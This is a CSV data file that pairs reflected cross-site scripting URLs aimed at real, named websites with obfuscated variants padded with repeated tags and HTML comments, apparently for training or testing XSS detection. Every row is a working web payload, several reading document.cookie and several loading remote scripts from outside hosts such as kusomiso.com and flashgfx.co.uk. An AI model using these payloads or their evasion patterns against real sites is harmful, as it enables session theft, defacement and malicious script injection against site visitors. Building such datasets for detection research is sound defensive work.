Payloads,Original
http://www.xesgalicia.org/vs_accesible/index2.php?seccion=xesgalicia.php&quot;&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;alert(document.coo<br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->>kie)&lt;<!--Comment-->/script&gt;&lt;<!--Comment-->/script&gt;&lt;<!--Comment-->/script&gt;&lt;<!--Comment-->/script&gt;&lt;<!--Comment-->/script&gt;&lt;<!--Comment-->/script&gt;&lt;<!--Comment-->/script&gt;&lt;<!--Comment-->/script&gt;&lt;<!--Comment-->/script&gt;&lt;<!--Comment-->/script&gt;&lt;<!--Comment-->/script&gt;&lt;<!--Comment-->/script&gt;&lt;<!--Comment-->/script&gt;&lt;<!--Comment-->/script&gt;&lt;<!--Comment-->/script&gt;&lt;<!--Comment-->/script&gt;,http://www.xesgalicia.org/vs_accesible/index2.php?seccion=xesgalicia.php&quot;&gt;&lt;script&gt;alert(document.coo<br>kie)&lt;/script&gt;
http://ask.jp/item/item.asp?o=%22%3e%27%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3ealert%28string.fromcharcode%2866%2c121%2c32%2c<br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->>107%2c117%2c115%2c111%2c109%2c105%2c115%2c111%2c46%2c99%2c111%2c109%29%29%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%0d%0a&amp;qsrc=<br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->>9&amp;q=link%3ahttp%3a%2f%2fwww.youtube.com%2fwatch%3fv%3dqvsgrwqgvl0&amp;sm=0&amp;btnitm.x=61&amp;btnitm.y=4,http://ask.jp/item/item.asp?o=%22%3e%27%3e%3cscript%3ealert%28string.fromcharcode%2866%2c121%2c32%2c<br>107%2c117%2c115%2c111%2c109%2c105%2c115%2c111%2c46%2c99%2c111%2c109%29%29%3c%2fscript%3e%0d%0a&amp;qsrc=<br>9&amp;q=link%3ahttp%3a%2f%2fwww.youtube.com%2fwatch%3fv%3dqvsgrwqgvl0&amp;sm=0&amp;btnitm.x=61&amp;btnitm.y=4
http://www.playlist.com/toboggan/offers?profile_cell_number=&quot;&gt;test&amp;agreed=&amp;username=&quot;&gt;&lt;/a<!--Comment-->&gt;&lt;/a<!--Comment-->&gt;&lt;/a<!--Comment-->&gt;&lt;/a<!--Comment-->&gt;&lt;/a<!--Comment-->&gt;&lt;/a<!--Comment-->&gt;&lt;/a<!--Comment-->&gt;&lt;/a<!--Comment-->&gt;&lt;<!--Comment-->marquee&gt;&lt;<!--Comment-->marquee&gt;&lt;<!--Comment-->marquee&gt;&lt;<!--Comment-->marquee&gt;&lt;<!--Comment-->marquee&gt;&lt;<!--Comment-->marquee&gt;&lt;<!--Comment-->marquee&gt;&lt;<!--Comment-->marquee&gt;t<br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->>est&lt;!--,http://www.playlist.com/toboggan/offers?profile_cell_number=&quot;&gt;test&amp;agreed=&amp;username=&quot;&gt;&lt;/a&gt;&lt;marquee&gt;t<br>est&lt;!--
http://bf1942stats.games.saix.net/game.php?id=%27%22%3e%3c/title<!--Comment-->%3e%3c/title<!--Comment-->%3e%3c/title<!--Comment-->%3e%3c/title<!--Comment-->%3e%3c/title<!--Comment-->%3e%3c/title<!--Comment-->%3e%3c/title<!--Comment-->%3e%3c/title<!--Comment-->%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3ealert%281337%29%3c<!--Comment-->/sc<br>ript%3e%3c<!--Comment-->/sc<br>ript%3e%3c<!--Comment-->/sc<br>ript%3e%3c<!--Comment-->/sc<br>ript%3e%3c<!--Comment-->/sc<br>ript%3e%3c<!--Comment-->/sc<br>ript%3e%3c<!--Comment-->/sc<br>ript%3e%3c<!--Comment-->/sc<br>ript%3e,http://bf1942stats.games.saix.net/game.php?id=%27%22%3e%3c/title%3e%3cscript%3ealert%281337%29%3c/sc<br>ript%3e
http://www.nero.com/nero7/eng/all_capture_devices.php?back=capture_devices_nh'%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3ealert(1<br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->>337)%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c<!--Comment-->script%20src=http://flashgfx.co.uk/xss.js%3e%3c<!--Comment-->script%20src=http://flashgfx.co.uk/xss.js%3e%3c<!--Comment-->script%20src=http://flashgfx.co.uk/xss.js%3e%3c<!--Comment-->script%20src=http://flashgfx.co.uk/xss.js%3e%3c<!--Comment-->script%20src=http://flashgfx.co.uk/xss.js%3e%3c<!--Comment-->script%20src=http://flashgfx.co.uk/xss.js%3e%3c<!--Comment-->script%20src=http://flashgfx.co.uk/xss.js%3e%3c<!--Comment-->script%20src=http://flashgfx.co.uk/xss.js%3e%3c<!--Comment-->script%20src=http://flashgfx.co.uk/xss.js%3e%3c<!--Comment-->script%20src=http://flashgfx.co.uk/xss.js%3e%3c<!--Comment-->script%20src=http://flashgfx.co.uk/xss.js%3e%3c<!--Comment-->script%20src=http://flashgfx.co.uk/xss.js%3e%3c<!--Comment-->script%20src=http://flashgfx.co.uk/xss.js%3e%3c<!--Comment-->script%20src=http://flashgfx.co.uk/xss.js%3e%3c<!--Comment-->script%20src=http://flashgfx.co.uk/xss.js%3e%3c<!--Comment-->script%20src=http://flashgfx.co.uk/xss.js%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e,http://www.nero.com/nero7/eng/all_capture_devices.php?back=capture_devices_nh'%3e%3cscript%3ealert(1<br>337)%3c/script%3e%3cscript%20src=http://flashgfx.co.uk/xss.js%3e%3c/script%3e
http://www.chukei.co.jp/cgi-bin/books/search.rb?title='%3e%22%3e%3c<!--Comment-->script/src=http://kusomiso.com/xs<br>s.js%3e%3c<!--Comment-->script/src=http://kusomiso.com/xs<br>s.js%3e%3c<!--Comment-->script/src=http://kusomiso.com/xs<br>s.js%3e%3c<!--Comment-->script/src=http://kusomiso.com/xs<br>s.js%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e,http://www.chukei.co.jp/cgi-bin/books/search.rb?title='%3e%22%3e%3cscript/src=http://kusomiso.com/xs<br>s.js%3e%3c/script%3e
http://goseek.com/search.php?d=webfile.com&amp;cachekey=1189806790&amp;pc=true&amp;term='%3e%22%3e%3cscript/src=<br<!--Comment-->>http://kusomiso.com/x.js%3e%3cscript/src=<br<!--Comment-->>http://kusomiso.com/x.js%3e%3cscript/src=<br<!--Comment-->>http://kusomiso.com/x.js%3e%3cscript/src=<br<!--Comment-->>http://kusomiso.com/x.js%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e,http://goseek.com/search.php?d=webfile.com&amp;cachekey=1189806790&amp;pc=true&amp;term='%3e%22%3e%3cscript/src=<br>http://kusomiso.com/x.js%3e%3c/script%3e
http://hacker.ws/parking.php4?task=search&amp;domain=hacker.ws&amp;trackquery=1&amp;s=bacb2145d7104258a8ea&amp;tb=0&amp;<br<!--Comment--><br<!--Comment-->>a_id=1&amp;language=en&amp;pgt=f598oxblhiskewir6zvs-7qoahud7f4khzdrneayayaamirwoam4dq&amp;pxy_t=0&amp;start=1&amp;add_c=<br<!--Comment--><br<!--Comment-->>e3483f49bc57803ee8a4b852f1601df8&amp;sub=1&amp;keyword=%27%3e%22%3e%3cscript%2fsrc%3dhttp%3a%2f%2fkusomiso.c<br<!--Comment-->>om%2fx.js%3e%3cscript%2fsrc%3dhttp%3a%2f%2fkusomiso.c<br<!--Comment-->>om%2fx.js%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e&amp;search=search,http://hacker.ws/parking.php4?task=search&amp;domain=hacker.ws&amp;trackquery=1&amp;s=bacb2145d7104258a8ea&amp;tb=0&amp;<br>a_id=1&amp;language=en&amp;pgt=f598oxblhiskewir6zvs-7qoahud7f4khzdrneayayaamirwoam4dq&amp;pxy_t=0&amp;start=1&amp;add_c=<br>e3483f49bc57803ee8a4b852f1601df8&amp;sub=1&amp;keyword=%27%3e%22%3e%3cscript%2fsrc%3dhttp%3a%2f%2fkusomiso.c<br>om%2fx.js%3e%3c%2fscript%3e&amp;search=search
http://www.kompass.com/kinl/static/index_kise.php?_lang=en&amp;login=no&amp;action=websearch&amp;_version=006649<br<!--Comment-->>1208627252&amp;_q=%27%22%3e%3e%3c<!--Comment-->marquee%3e%3ch1<!--Comment-->%3e%3cstrong<!--Comment-->%3e%3ci<!--Comment-->%3ecueballr%3c+i<!--Comment-->%3e%3c<!--Comment-->+strong%3e%3c+h<br<!--Comment-->>1%3e%3c+marquee<!--Comment-->%3e&amp;_keyword=%27%22%3e%3e%3c<!--Comment-->marquee%3e%3c<!--Comment-->h1%3e%3c<!--Comment-->strong%3e%3ci<!--Comment-->%3ecueballr%3c<!--Comment-->+i%3e%3c<!--Comment-->+<br>strong%3e%3c<!--Comment-->+h1%3e%3c<!--Comment-->+marquee%3e&amp;_choix=ps&amp;_country=&amp;_zone=ww&amp;_region=,http://www.kompass.com/kinl/static/index_kise.php?_lang=en&amp;login=no&amp;action=websearch&amp;_version=006649<br>1208627252&amp;_q=%27%22%3e%3e%3cmarquee%3e%3ch1%3e%3cstrong%3e%3ci%3ecueballr%3c+i%3e%3c+strong%3e%3c+h<br>1%3e%3c+marquee%3e&amp;_keyword=%27%22%3e%3e%3cmarquee%3e%3ch1%3e%3cstrong%3e%3ci%3ecueballr%3c+i%3e%3c+<br>strong%3e%3c+h1%3e%3c+marquee%3e&amp;_choix=ps&amp;_country=&amp;_zone=ww&amp;_region=
http://www.museociudadquito.gob.ec/www/busqueda/busqueda.php?buscar=+%2f%2f%22%3e%27%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3ealert%28%22[_ur0b0r0x_]%22%29%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e,http://www.museociudadquito.gob.ec/www/busqueda/busqueda.php?buscar=+%2f%2f%22%3e%27%3e%3cscript%3ealert%28%22[_ur0b0r0x_]%22%29%3c%2fscript%3e
